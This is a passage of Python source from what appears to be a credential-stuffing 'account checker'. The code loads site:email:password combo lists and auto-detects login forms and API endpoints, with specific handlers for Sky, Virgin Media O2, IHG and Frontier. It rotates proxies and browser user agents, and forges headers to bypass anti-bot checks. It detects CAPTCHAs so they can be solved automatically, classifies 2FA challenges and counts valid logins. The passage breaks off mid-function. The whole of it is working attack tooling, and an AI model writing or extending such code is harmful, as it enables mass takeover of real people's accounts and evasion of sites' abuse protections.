            login_url=login_url,
            auth_method=AuthMethod.FORM,
            username_field="un",
            password_field="pw",
            additional_fields={},
            csrf_tokens={},
            headers=headers,
            success_indicators=self.success_indicators,
            failure_indicators=self.failure_indicators,
            captcha_present=False,
            captcha_page_url=referer
        )

    def _handle_sky_site(self, html: str) -> LoginConfig:
        """Sky.com exposes a dedicated OAuth based signin entrypoint."""
        login_match = re.search(r'https://www\.sky\.com/signin\?[^"\\s<]+', html)
        login_url = "https://www.sky.com/signin"
        if login_match:
            raw_url = login_match.group(0)
            login_url = raw_url.replace("\\u0026", "&").replace("&amp;", "&")

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "User-Agent": random.choice(USER_AGENTS),
        }

        return LoginConfig(
            login_url=login_url,
            auth_method=AuthMethod.OAUTH,
            username_field="username",
            password_field="password",
            additional_fields={},
            csrf_tokens={},
            headers=headers,
            success_indicators=self.success_indicators,
            failure_indicators=self.failure_indicators,
            captcha_present=False,
            captcha_page_url=login_url
        )

    def _handle_virginmediao2_site(self, html: str) -> LoginConfig:
        """Virgin Media O2 redirects through accounts.o2.co.uk auth endpoint."""
        login_match = re.search(r'https://accounts\.o2\.co\.uk/auth\?[^"\\s<]+', html)
        login_url = "https://accounts.o2.co.uk/auth"
        if login_match:
            raw_url = login_match.group(0)
            login_url = raw_url.replace("\\u0026", "&").replace("&amp;", "&")

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "User-Agent": random.choice(USER_AGENTS),
        }

        return LoginConfig(
            login_url=login_url,
            auth_method=AuthMethod.OAUTH,
            username_field="username",
            password_field="password",
            additional_fields={},
            csrf_tokens={},
            headers=headers,
            success_indicators=self.success_indicators,
            failure_indicators=self.failure_indicators,
            captcha_present=False,
            captcha_page_url=login_url
        )

    def _handle_ihg_site(self, final_url: str) -> LoginConfig:
        """IHG relies on a dedicated rewards club sign-in route with API-based authentication.
        
        IHG Hotels uses a REST API-based authentication system. The login endpoints accept
        JSON payloads with username/email and password. Common endpoints include:
        - https://www.ihg.com/rewardsclub/api/signin
        - https://www.ihg.com/api/member/authenticate
        - https://www.ihg.com/rewardsclub/us/en/sign-in (page URL, needs API extraction)
        """
        # Primary API endpoint for IHG authentication
        # We'll try multiple endpoints in the check_account flow
        login_url = "https://www.ihg.com/rewardsclub/api/v1/signin"
        
        # IHG uses JSON API for login with modern headers
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": random.choice(USER_AGENTS),
            "Origin": "https://www.ihg.com",
            "Referer": "https://www.ihg.com/rewardsclub/us/en/sign-in",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"'
        }
        
        # IHG uses 'username' (can be email or member number) and 'password'
        # Additional fields that IHG API commonly expects
        additional_fields = {
            "rememberMe": False,
            "brand": "IHG",
            "locale": "en_US"
        }
        
        # Enhanced success indicators specific to IHG responses
        ihg_success_indicators = self.success_indicators + [
            'member', 'points', 'rewards', 'authenticated', 'sessionToken',
            'memberId', 'accountNumber', 'loyaltyId'
        ]
        
        # Enhanced failure indicators specific to IHG responses  
        ihg_failure_indicators = self.failure_indicators + [
            'invalidCredentials', 'accountLocked', 'notFound',
            'incorrectPassword', 'invalidUsername', 'authenticationFailed'
        ]

        return LoginConfig(
            login_url=login_url,
            auth_method=AuthMethod.JSON_API,
            username_field="username",  # IHG accepts 'username' (email or member number)
            password_field="password",
            additional_fields=additional_fields,
            csrf_tokens={},
            headers=headers,
            success_indicators=ihg_success_indicators,
            failure_indicators=ihg_failure_indicators,
            captcha_present=False,
            captcha_page_url=final_url or "https://www.ihg.com/rewardsclub/us/en/sign-in"
        )
    
    def _extract_login_links_from_html(self, html: str, base_url: str) -> List[str]:
        """Extract potential login/signin links from HTML"""
        links = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # Look for links with login-related text or hrefs
            for link in soup.find_all('a', href=True):
                href = link.get('href', '')
                text = link.get_text().lower().strip()
                
                # Check href for login keywords
                if any(keyword in href.lower() for keyword in ['login', 'signin', 'sign-in', 'log-in', 'auth', 'account/login']):
                    full_url = urljoin(base_url, href)
                    if full_url not in links:
                        links.append(full_url)
                        continue
                
                # Check link text for login keywords
                if any(keyword in text for keyword in ['log in', 'sign in', 'login', 'signin', 'sign-in', 'log-in']):
                    full_url = urljoin(base_url, href)
                    if full_url not in links:
                        links.append(full_url)
        except Exception as e:
            logger.error(f"Error extracting login links: {e}")
        
        return links
    
    # NEW: Helper function to detect CAPTCHA
    def _detect_captcha(self, soup: BeautifulSoup) -> Tuple[bool, Optional[str], Optional[str]]:
        """Detect common CAPTCHA elements in the page and extract metadata."""
        html_cache = None

        def extract_attribute(possible_attrs: List[str]) -> Optional[str]:
            nonlocal html_cache
            for attr in possible_attrs:
                element = soup.find(attrs={attr: True})
                if element:
                    value = element.get(attr)
                    if value:
                        return value
            if html_cache is None:
                html_cache = str(soup)
            for attr in possible_attrs:
                match = re.search(fr'{attr}=["\']([^"\']+)["\']', html_cache, re.I)
                if match:
                    return match.group(1)
            return None

        # Cloudflare Turnstile
        turnstile_elem = soup.find('div', class_=re.compile(r'cf-turnstile', re.I))
        if turnstile_elem or soup.find('script', src=re.compile(r'challenges\.cloudflare\.com', re.I)):
            site_key = turnstile_elem.get('data-sitekey') if turnstile_elem else extract_attribute(['data-sitekey'])
            logger.info("Cloudflare Turnstile detected")
            return True, 'turnstile', site_key

        # FunCAPTCHA / Arkose Labs
        funcaptcha_elem = soup.find(attrs={'data-pkey': True}) or soup.find('div', id=re.compile(r'funcaptcha|arkose', re.I)) \
            or soup.find('iframe', src=re.compile(r'funcaptcha\.com|arkoselabs\.com', re.I)) \
            or soup.find('script', src=re.compile(r'funcaptcha\.com|arkoselabs\.com', re.I))
        if funcaptcha_elem:
            site_key = getattr(funcaptcha_elem, 'get', lambda _: None)('data-pkey') or extract_attribute(['data-pkey', 'data-publickey'])
            logger.info("FunCAPTCHA/Arkose detected")
            return True, 'funcaptcha', site_key

        # hCaptcha
        hcaptcha_elem = soup.find('div', class_=re.compile(r'h-captcha', re.I))
        if (hcaptcha_elem or 
            soup.find('iframe', src=re.compile(r'hcaptcha\.com/', re.I)) or
            soup.find('script', src=re.compile(r'hcaptcha\.com/', re.I))):
            site_key = hcaptcha_elem.get('data-sitekey') if hcaptcha_elem else extract_attribute(['data-sitekey'])
            logger.info("hCaptcha detected")
            return True, 'hcaptcha', site_key

        # reCAPTCHA (v2/v3)
        recaptcha_elem = soup.find('div', class_=re.compile(r'g-recaptcha|recaptcha', re.I)) or \
            soup.find('iframe', src=re.compile(r'recaptcha/api/', re.I)) or \
            soup.find('script', src=re.compile(r'recaptcha/api\.js', re.I)) or \
            soup.find('div', attrs={'data-sitekey': True})
        if recaptcha_elem:
            site_key = extract_attribute(['data-sitekey'])
            logger.info("reCAPTCHA detected")
            return True, 'recaptcha', site_key

        # Generic indicators
        page_text = soup.get_text().lower()
        captcha_keywords = ['captcha', 'verify you are human', 'prove you are not a robot',
                            'security check', 'bot detection']
        if any(keyword in page_text for keyword in captcha_keywords):
            logger.info("Generic CAPTCHA indicators found in page text")
            return True, None, None

        return False, None, None

    def _find_login_form(self, html: str, url: str, site_config: Optional[Dict] = None) -> Optional[LoginConfig]:
        """Find login form in HTML with enhanced detection"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # NEW: Detect CAPTCHA on the page
            captcha_present, captcha_type, captcha_site_key = self._detect_captcha(soup)
            
            forms = soup.find_all('form')
            
            # If no forms found, try looking for React/Vue/Angular style login components
            if not forms:
                login_config = self._detect_spa_login(soup, url, captcha_present, captcha_type, captcha_site_key, site_config)
                if login_config:
                    return login_config
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'post').lower()
                
                # Look for password fields in the form
                password_inputs = form.find_all('input', {'type': 'password'})
                if not password_inputs:
                    continue
                
                # Find username/email field
                username_field = self._find_username_field(form, site_config)
                
                # Get password field name with fallbacks
                password_field = self._find_password_field(password_inputs, site_config)
                
                if username_field:
                    # Extract CSRF tokens and additional fields
                    csrf_tokens = self._extract_csrf_tokens(form, soup)
                    additional_fields = self._extract_additional_fields(form)
                    captcha_response_field = self._detect_captcha_response_field(form)
                    
                    # Determine form URL
                    form_url = urljoin(url, form_action) if form_action else url
                    
                    return LoginConfig(
                        login_url=form_url,
                        auth_method=AuthMethod.FORM,
                        username_field=username_field,
                        password_field=password_field,
                        additional_fields=additional_fields,
                        csrf_tokens=csrf_tokens,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        success_indicators=self.success_indicators,
                        failure_indicators=self.failure_indicators,
                        captcha_present=captcha_present,
                        captcha_type=captcha_type,
                        captcha_site_key=captcha_site_key,
                        captcha_response_field=captcha_response_field,
                        captcha_page_url=url
                    )
                    
        except Exception as e:
            logger.error(f"Error finding login form: {e}")
        
        return None
    
    def _detect_spa_login(self, soup: BeautifulSoup, url: str, captcha_present: bool,
                          captcha_type: Optional[str], captcha_site_key: Optional[str],
                          site_config: Optional[Dict] = None) -> Optional[LoginConfig]:
        """Detect login forms in Single Page Applications (React/Vue/Angular)"""
        try:
            # Look for common SPA login patterns in divs/sections
            login_containers = soup.find_all(['div', 'section'], 
                                           class_=re.compile(r'login|signin|auth', re.I))
            
            for container in login_containers:
                # Look for input fields in the container
                inputs = container.find_all('input')
                has_password = any(inp.get('type') == 'password' for inp in inputs)
                
                if has_password:
                    # Try to find username/email input
                    username_input = None
                    password_input = None
                    
                    for inp in inputs:
                        inp_type = inp.get('type', '').lower()
                        inp_name = inp.get('name', '')
                        inp_id = inp.get('id', '')
                        inp_placeholder = inp.get('placeholder', '').lower()
                        
                        # Detect username field
                        if not username_input and (
                            inp_type in ['text', 'email'] or
                            any(field in inp_name.lower() for field in ['email', 'user', 'login']) or
                            any(field in inp_id.lower() for field in ['email', 'user', 'login']) or
                            any(field in inp_placeholder for field in ['email', 'user', 'login'])
                        ):
                            username_input = inp
                        
                        # Detect password field
                        if inp_type == 'password':
                            password_input = inp
                    
                    if username_input and password_input:
                        username_field = username_input.get('name') or username_input.get('id') or 'email'
                        password_field = password_input.get('name') or password_input.get('id') or 'password'
                        
                        # For SPAs, likely using JSON API
                        return LoginConfig(
                            login_url=url,  # Will need to detect actual API endpoint from network calls
                            auth_method=AuthMethod.JSON_API,
                            username_field=username_field,
                            password_field=password_field,
                            additional_fields={},
                            csrf_tokens={},
                            headers={'Content-Type': 'application/json'},
                            success_indicators=self.success_indicators,
                            failure_indicators=self.failure_indicators,
                            captcha_present=captcha_present,
                            captcha_type=captcha_type,
                            captcha_site_key=captcha_site_key,
                            captcha_page_url=url
                        )
        except Exception as e:
            logger.error(f"Error detecting SPA login: {e}")
        
        return None
    
    def _find_username_field(self, form, site_config: Optional[Dict] = None) -> Optional[str]:
        """Find username/email field in form with enhanced detection"""
        # Prepare field names to check (site-specific first)
        fields_to_check = self.username_fields.copy()
        if site_config and 'username_fields' in site_config:
            fields_to_check = site_config['username_fields'] + fields_to_check
        
        # First, try exact matches with name attribute
        for field_name in fields_to_check:
            input_field = form.find('input', {'name': re.compile(f'^{field_name}$', re.I)})
            if input_field:
                return input_field.get('name')
        
        # Try matching with id attribute
        for field_name in fields_to_check:
            input_field = form.find('input', {'id': re.compile(f'^{field_name}$', re.I)})
            if input_field:
                return input_field.get('name', field_name)
        
        # Try partial matches in name attribute
        for field_name in fields_to_check:
            input_field = form.find('input', {'name': re.compile(f'.*{field_name}.*', re.I)})
            if input_field:
                return input_field.get('name')
        
        # Try partial matches in id attribute
        for field_name in fields_to_check:
            input_field = form.find('input', {'id': re.compile(f'.*{field_name}.*', re.I)})
            if input_field:
                return input_field.get('name', input_field.get('id'))
        
        # Look for input with type='email'
        email_input = form.find('input', {'type': 'email'})
        if email_input:
            return email_input.get('name', 'email')
        
        # Check for autocomplete attributes
        autocomplete_fields = form.find_all('input', {'autocomplete': re.compile(r'username|email', re.I)})
        if autocomplete_fields:
            return autocomplete_fields[0].get('name', 'username')
        
        # Look for placeholder text hints
        placeholder_inputs = form.find_all('input', {'placeholder': re.compile(r'email|username|user|login', re.I)})
        if placeholder_inputs:
            return placeholder_inputs[0].get('name', 'email')
    
    def _find_password_field(self, password_inputs, site_config: Optional[Dict] = None) -> str:
        """Find password field name with site-specific support"""
        if not password_inputs:
            return 'password'
        
        password_input = password_inputs[0]
        password_field = password_input.get('name')
        
        if not password_field:
            password_field = password_input.get('id', 'password')
        
        # Validate against site-specific password fields if available
        if site_config and 'password_fields' in site_config and password_field:
            # Keep the detected field
            pass
        
        return password_field
    
    # MODIFIED: Now takes soup to check for meta tags
    def _extract_csrf_tokens(self, form, soup: BeautifulSoup) -> Dict[str, str]:
        """Extract CSRF tokens from form and meta tags"""
        tokens = {}
        
        # 1. Check form for hidden inputs
        csrf_inputs = form.find_all('input', {
            'name': re.compile(r'csrf|token|authenticity', re.I)
        })
        
        for input_field in csrf_inputs:
            token_name = input_field.get('name')
            token_value = input_field.get('value', '')
            if token_name and token_value:
                tokens[token_name] = token_value
        
        # 2. NEW: Check page for meta tags (common in JS frameworks)
        meta_tokens = soup.find_all('meta', {
            'name': re.compile(r'csrf-token|x-csrf-token', re.I)
        })
        
        for meta_tag in meta_tokens:
            token_name = meta_tag.get('name')
            token_value = meta_tag.get('content', '')
            if token_name and token_value:
                # Add to tokens, but also often needs to be sent as a header
                tokens[token_name] = token_value
        
        return tokens
    
    def _extract_additional_fields(self, form) -> Dict[str, str]:
        """Extract additional hidden fields from form"""
        fields = {}
        hidden_inputs = form.find_all('input', {'type': 'hidden'})
        
        for input_field in hidden_inputs:
            field_name = input_field.get('name')
            field_value = input_field.get('value', '')
            if field_name and field_name not in ['csrf', 'token']:
                fields[field_name] = field_value
        
        return fields

    def _detect_captcha_response_field(self, form) -> Optional[str]:
        """Attempt to identify the expected CAPTCHA response field in a form."""
        for input_field in form.find_all('input'):
            field_name = input_field.get('name', '')
            if not field_name:
                continue
            lowered = field_name.lower()
            if any(keyword in lowered for keyword in ['captcha', 'recaptcha', 'hcaptcha', 'turnstile']):
                return field_name
        return None
    
    def _detect_api_endpoints(self, session: requests.Session, base_url: str, html: str = None,
                            proxy: Optional[Dict] = None, timeout: int = 10, site_config: Optional[Dict] = None) -> Optional[LoginConfig]:
        """Detect API login endpoints with enhanced pattern matching"""
        api_endpoints = [
            '/api/login', '/api/auth', '/api/v1/auth', '/api/v2/auth', '/api/v3/auth',
            '/auth/login', '/oauth/token', '/graphql', '/rest/auth',
            '/json/auth', '/ajax/login',
            # Extended API endpoints
            '/api/signin', '/api/sign-in', '/api/v1/login', '/api/v2/login',
            '/api/v1/signin', '/api/v2/signin', '/api/v3/login',
            '/api/authentication', '/api/authorize', '/api/session',
            '/api/sessions', '/api/sessions/create', '/api/user/login',
            '/api/user/auth', '/api/users/login', '/api/users/auth',
            '/api/account/login', '/api/accounts/login', '/api/customer/login',
            '/rest/login', '/rest/signin', '/rest/v1/auth', '/rest/v2/auth',
            '/rest/session', '/rest/sessions', '/rest/user/auth',
            '/services/auth', '/services/login', '/gateway/auth',
            '/oauth/v2/token', '/oauth2/token', '/connect/token',
            '/identity/connect/token', '/token', '/api/token',
            '/api/oauth/token', '/sso/login', '/sso/auth'
        ]
        
        # Prepend site-specific API endpoints if available
        if site_config and 'api_endpoints' in site_config:
            api_endpoints = site_config['api_endpoints'] + api_endpoints
        
        for endpoint in api_endpoints:
            try:
                api_url = urljoin(base_url, endpoint)
                response = session.get(api_url, proxies=proxy, timeout=10)
                
                if response.status_code in [200, 405]:  # 405 means method not allowed (POST required)
                    # Try to determine field names from API response or OPTIONS
                    username_field, password_field = self._detect_api_fields(session, api_url, proxy)
                    
                    return LoginConfig(
                        login_url=api_url,
                        auth_method=AuthMethod.JSON_API,
                        username_field=username_field,
                        password_field=password_field,
                        additional_fields={},
                        csrf_tokens={},
                        headers={'Content-Type': 'application/json'},
                        success_indicators=self.success_indicators,
                        failure_indicators=self.failure_indicators,
                        captcha_present=False,  # Assume no captcha for pure API, but could be wrong
                        captcha_page_url=base_url
                    )
            except:
                continue

        # If not found in standard endpoints, try to scan inline scripts or HTML for likely API URLs
        if html:
            # Enhanced patterns to capture API endpoints from JavaScript
            patterns = [
                r'["\']([/\w\-]*api[/\w\-]*login[/\w\-]*)["\']',
                r'["\']([/\w\-]*api[/\w\-]*auth[/\w\-]*)["\']',
                r'["\']([/\w\-]*api[/\w\-]*signin[/\w\-]*)["\']',
                r'["\']([/\w\-]*api[/\w\-]*session[/\w\-]*)["\']',
                r'["\']([/\w\-]*oauth[/\w\-]*token[/\w\-]*)["\']',
                r'["\']([/\w\-]*auth[/\w\-]*login[/\w\-]*)["\']',
                r'["\']([/\w\-]*rest[/\w\-]*auth[/\w\-]*)["\']',
                r'url:\s*["\']([/\w\-]*(?:api|auth|login|signin)[/\w\-]*)["\']',
                r'endpoint:\s*["\']([/\w\-]*(?:api|auth|login|signin)[/\w\-]*)["\']',
                r'action:\s*["\']([/\w\-]*(?:api|auth|login|signin)[/\w\-]*)["\']'
            ]
            
            for pat in patterns:
                matches = re.finditer(pat, html, re.I)
                for m in matches:
                    try:
                        candidate = m.group(1)
                        # Filter out common false positives
                        if any(word in candidate.lower() for word in ['login', 'auth', 'signin', 'session', 'token']):
                            api_url = urljoin(base_url, candidate)
                            username_field, password_field = self._detect_api_fields(session, api_url, proxy)
                            
                            return LoginConfig(
                                login_url=api_url,
                                auth_method=AuthMethod.JSON_API,
                                username_field=username_field,
                                password_field=password_field,
                                additional_fields={},
                                csrf_tokens={},
                                headers={'Content-Type': 'application/json'},
                                success_indicators=self.success_indicators,
                                failure_indicators=self.failure_indicators,
                                captcha_present=False,
                                captcha_page_url=base_url
                            )
                    except Exception:
                        continue

        return None
    
    def _detect_api_fields(self, session: requests.Session, api_url: str, proxy: Optional[Dict] = None) -> Tuple[str, str]:
        """Detect field names for API endpoints by trying OPTIONS or analyzing error responses"""
        username_field = 'email'
        password_field = 'password'
        
        try:
            # Try OPTIONS request to get API schema
            options_response = session.options(api_url, proxies=proxy, timeout=5)
            if options_response.status_code == 200:
                try:
                    schema = options_response.json()
                    # Look for field names in schema
                    if isinstance(schema, dict):
                        for key in schema.keys():
                            if any(field in key.lower() for field in ['email', 'user', 'login', 'account']):
                                username_field = key
                            if any(field in key.lower() for field in ['password', 'pass', 'pwd']):
                                password_field = key
                except:
                    pass
            
            # Try a POST with empty data to get field requirements from error
            try:
                test_response = session.post(api_url, json={}, proxies=proxy, timeout=5)
                if test_response.status_code in [400, 422]:  # Bad request - field validation error
                    try:
                        error_data = test_response.json()
                        error_text = json.dumps(error_data).lower()
                        
                        # Look for field names in error messages
                        if 'username' in error_text:
                            username_field = 'username'
                        elif 'user' in error_text:
                            username_field = 'user'
                        elif 'email' in error_text:
                            username_field = 'email'
                        elif 'login' in error_text:
                            username_field = 'login'
                            
                        if 'pass' in error_text or 'pwd' in error_text:
                            password_field = 'password'
                    except:
                        pass
            except:
                pass
                
        except:
            pass
        
        return username_field, password_field
    
    def _create_default_config(self, base_url: str) -> LoginConfig:
        """Create default login configuration"""
        return LoginConfig(
            login_url=urljoin(base_url, '/login'),
            auth_method=AuthMethod.UNKNOWN,
            username_field='email',
            password_field='password',
            additional_fields={},
            csrf_tokens={},
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            success_indicators=self.success_indicators,
            failure_indicators=self.failure_indicators,
            captcha_present=False,
            captcha_page_url=base_url
        )

class UniversalAccountChecker:
    def __init__(self):
        # self.session = requests.Session() # This session is not used for checks
        # self.setup_session() # This was not being used
        self.proxy_manager = AdvancedProxyManager()
        self.site_analyzer = UniversalSiteAnalyzer()
        self.captcha_solver = CaptchaSolver()
        
        # Initialize Selenium-based helpers if available
        if SELENIUM_AVAILABLE:
            self.local_captcha_solver = LocalCaptchaSolver(headless=True)
            self.selenium_login_helper = SeleniumLoginHelper(headless=True)
            logger.info("Selenium-based login and CAPTCHA solving enabled")
        else:
            self.local_captcha_solver = None
            self.selenium_login_helper = None
            logger.warning("Selenium not available - some features may be limited")
        
        self.site_configs: Dict[str, LoginConfig] = {}
        self.stats = {
            'checked': 0,
            'success': 0,
            'failed': 0,
            'errors': 0,
            'rate_limited': 0,
            'captcha': 0,
            '2fa': 0
        }
        self.running = False
        self.lock = threading.Lock()
        self.use_selenium_fallback = True  # Enable Selenium fallback for difficult sites
        
    def setup_session(self):
        """This method is not used as each check creates its own session."""
        pass
    
    def configure_captcha_solver(self, provider_chain: List[Tuple[CaptchaProvider, str]]):
        """Configure the CAPTCHA solver with an ordered provider list."""
        self.captcha_solver.configure(provider_chain or [])
    
    def analyze_site(self, site_url: str, use_proxies: bool = True) -> LoginConfig:
        """Analyze a site and cache the configuration"""
        if site_url in self.site_configs:
            return self.site_configs[site_url]
        
        proxy = self.proxy_manager.get_proxy(ProxyType.ANY, use_proxies)
        config = self.site_analyzer.analyze_site(site_url, proxy)
        self.site_configs[site_url] = config
        
        logger.info(f"Analyzed site {site_url}: method={config.auth_method.value}, "
                   f"username_field={config.username_field}, password_field={config.password_field}, "
                   f"captcha_present={config.captcha_present}") # MODIFIED: Log captcha status
        
        return config
    
    def load_accounts(self, accounts_file: str) -> List[Tuple[str, str, str]]:
        """Load accounts from file with site support"""
        accounts = []
        try:
            with open(accounts_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Try to parse site:email:password first
                    # Split by ':', max 2 splits (3 parts)
                    parts = line.split(':', 2)
                    
                    # Check if it looks like site:email:pass (part 0 has domain chars, part 2 exists)
                    if len(parts) == 3 and ('.' in parts[0] or '/' in parts[0]):
                        site, email, password = parts
                        accounts.append((site.strip(), email.strip(), password.strip()))
                    else:
                        # Assume email:password, try common separators
                        found = False
                        separators = [':', ';', '|', '\t']
                        for sep in separators:
                            if sep in line:
                                parts = line.split(sep, 1)
                                if len(parts) == 2:
                                    email, password = parts[0].strip(), parts[1].strip()
                                    if email and password:
                                        accounts.append(('default', email, password))
                                        found = True
                                        break
                        if not found:
                            logger.warning(f"Skipping malformed line {line_num}: {line}")
            
            logger.info(f"Loaded {len(accounts)} accounts from {accounts_file}")
            return accounts
        except Exception as e:
            logger.error(f"Error loading accounts from {accounts_file}: {e}")
            return []
    
    def _build_antibot_headers(self, config: LoginConfig) -> Dict[str, str]:
        """Construct a richer header set to mimic real browsers and bypass basic anti-bot."""
        headers = (config.headers or {}).copy()
        headers.setdefault('User-Agent', random.choice(USER_AGENTS))
        headers.setdefault('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8')
        headers.setdefault('Accept-Language', 'en-US,en;q=0.9')
        headers.setdefault('Accept-Encoding', 'gzip, deflate, br')
        headers.setdefault('Connection', 'keep-alive')
        headers.setdefault('Pragma', 'no-cache')
        headers.setdefault('Cache-Control', 'no-cache')
        headers.setdefault('Upgrade-Insecure-Requests', '1')
        headers.setdefault('Sec-Ch-Ua', '"Chromium";v="120", "Not.A/Brand";v="24", "Google Chrome";v="120"')
        headers.setdefault('Sec-Ch-Ua-Mobile', '?0')
        headers.setdefault('Sec-Ch-Ua-Platform', '"Windows"')

        if not headers.get('Referer'):
            headers['Referer'] = config.captcha_page_url or config.login_url

        if not headers.get('Origin'):
            parsed = urlparse(config.login_url)
            if parsed.scheme and parsed.netloc:
                headers['Origin'] = f"{parsed.scheme}://{parsed.netloc}"

        return headers

    def _prime_login_session(
        self,
        session: requests.Session,
        config: LoginConfig,
        proxy: Optional[Dict],
        timeout: int
    ):
        """Warm up session for sites that require preliminary cookies before login."""
        try:
            if "booking.flyfrontier.com/api/CorpLogin" in (config.login_url or ""):
                preload_url = config.captcha_page_url or "https://www.flyfrontier.com/"
                session.get(
                    preload_url,
                    proxies=proxy,
                    timeout=min(timeout, 20),
                    allow_redirects=True,
                    verify=False
                )
        except Exception as exc:
            logger.debug(f"Session priming skipped for {config.login_url}: {exc}")

    def _get_captcha_field_candidates(self, config: LoginConfig) -> List[str]:
        """Return likely field names for submitting CAPTCHA tokens."""
        if config.captcha_response_field:
            return [config.captcha_response_field]
        mapping = {
            'recaptcha': ['g-recaptcha-response', 'recaptcha_token', 'recaptchaResponse', 'recaptchaToken'],
            'hcaptcha': ['h-captcha-response', 'hcaptcha_response', 'captcha'],
            'turnstile': ['cf-turnstile-response', 'turnstile-response', 'captcha'],
            'funcaptcha': ['arkose_token', 'token', 'fc-token', 'captcha'],
        }
        captcha_type = (config.captcha_type or '').lower()
        return mapping.get(captcha_type, ['captcha'])

    def _normalize_response_text(self, text: Optional[str]) -> str:
        if not text:
            return ""
        return re.sub(r'\s+', ' ', text).lower()

    def _contains_any_keyword(self, haystack: str, keywords: List[str]) -> bool:
        if not haystack:
            return False
        for keyword in keywords:
            if keyword and keyword in haystack:
                return True
        return False

    def _match_any_pattern(self, haystack: str, patterns: List[str]) -> bool:
        if not haystack:
            return False
        return any(re.search(pattern, haystack) for pattern in patterns)

    def _extract_json_strings(self, payload: Any) -> List[str]:
        values: List[str] = []
        if isinstance(payload, dict):
            for value in payload.values():
                values.extend(self._extract_json_strings(value))
        elif isinstance(payload, list):
            for item in payload:
                values.extend(self._extract_json_strings(item))
        elif isinstance(payload, (str, int, float, bool)):
            values.append(str(payload).lower())
        return values

    def _analyze_corp_person_response(self, payload: Any) -> Optional[CheckStatus]:
        """Special handling for Frontier corpPersonResponse payloads."""
        if not isinstance(payload, dict):
            return None

        corp = payload.get("corpPersonResponse")
        if not isinstance(corp, dict):
            return None

        if corp.get("forcePasswordReset") is True:
            return CheckStatus.SUCCESS

        valid = corp.get("valid")
        if valid is True:
            return CheckStatus.SUCCESS
        if valid is False:
            return CheckStatus.FAILED

        error_message = corp.get("errorMessage") or corp.get("error")
        if isinstance(error_message, str) and error_message.strip():
            return CheckStatus.FAILED

        messages = corp.get("messages")
        if isinstance(messages, list):
            normalized = " ".join(str(m).lower() for m in messages if m)
            if normalized and self._contains_any_keyword(normalized, self.failure_indicators):
                return CheckStatus.FAILED

        return None

    def _is_two_factor_challenge(
        self,
        response: requests.Response,
        response_text: str,
        response_json_text: str,
        has_failure: bool
    ) -> bool:
        header_blob = " ".join(
            f"{key}: {value}"
            for key, value in response.headers.items()
            if key and value
        ).lower()

        header_keywords = [
            'x-2fa', 'x-two-factor', 'x-mfa',
            'otp-required', 'two-factor', 'mfa-required',
            'requires-2fa', 'require-2fa'
        ]
        if self._contains_any_keyword(header_blob, header_keywords):
            return True

        strong_patterns = [
            r'\b2[\s\-]?fa\b',
            r'\btwo[\s\-]?factor\b',
            r'\bmfa\b',
            r'\bmulti[\s\-]?factor\b',
            r'\b2[\s\-]?step\b',
            r'\btwo[\s\-]?step\b',
            r'\bone[\s\-]?time pass(?:word|code)\b',
            r'\botp\b',
            r'\bauthenticator\b',
            r'\bauthentication app\b',
        ]

        negative_patterns = [
            r'\btwo[\s\-]?factor\b.{0,40}\b(disable|disabled|optional|not required)\b',
            r'\bdisable\b.{0,40}\btwo[\s\-]?factor\b',
            r'\bwithout two[\s\-]?factor\b'
        ]

        negative_hit = any(
            self._match_any_pattern(blob, negative_patterns)
            for blob in (response_text, response_json_text)
        )

        if not negative_hit:
            for blob in (response_text, response_json_text, header_blob):
                if self._match_any_pattern(blob, strong_patterns):
                    return True

        if has_failure:
            return False

        contextual_patterns = [
            r'\bverification code\b.{0,80}\b(sent|send|emailed|texted|delivered)\b',
            r'(?:sent|sending|deliver(?:ed|ing)).{0,80}\bverification code\b',
            r'\benter\b.{0,40}\bverification code\b',
            r'\benter\b.{0,40}\bsecurity code\b',
            r'\bsms code\b',
            r'\bcheckpoint code\b',
            r'\bcode\b.{0,40}\bauthenticator\b',
        ]

        for blob in (response_text, response_json_text):
            if self._match_any_pattern(blob, contextual_patterns):
                return True

        return False
    
    def check_account(self, site: str, email: str, password: str, 
                     proxy: Optional[Dict] = None, 
                     timeout: int = 30,
                     use_proxies: bool = True) -> CheckResult:
        """Check account on specified site"""
        start_time = time.time()
        
        # Determine proxy status for reporting
        if proxy and 'http' in proxy:
            proxy_display = proxy['http']
            logger.debug(f"Using proxy: {proxy_display}")
        elif use_proxies:
            total_proxies = self.proxy_manager.get_proxy_count()
            if total_proxies > 0:
                proxy_display = f"Proxy error: {total_proxies} loaded but none valid/available"
                logger.warning(f"Proxies loaded ({total_proxies}) but get_proxy returned None")
            else:
                proxy_display = "No proxies loaded"
                logger.warning("use_proxies=True but no proxies are loaded")
        else:
            proxy_display = "Direct connection (no proxy)"
        
        result = CheckResult(
            email=email,
            password=password,
            status=CheckStatus.UNKNOWN_ERROR,
            response="",
            proxy_used=proxy_display,
            response_time=0,
            timestamp=datetime.now(),
            site=site,
            auth_method=AuthMethod.UNKNOWN
        )
        
        temp_session = None
        try:
            # Analyze site if not already analyzed
            if site == 'default':
                # This should be set by the GUI. If not, it's a test.
                # We'll use a placeholder, but this should be handled by GUI logic.
                logger.warning("Default site used in check_account. This should be overridden.")
                site = 'https://example.com' 
                
            config = self.analyze_site(site, use_proxies)
            result.auth_method = config.auth_method

            captcha_token = None
            captcha_provider_used: Optional[CaptchaProvider] = None
            captcha_fields: List[str] = []

            if config.captcha_present:
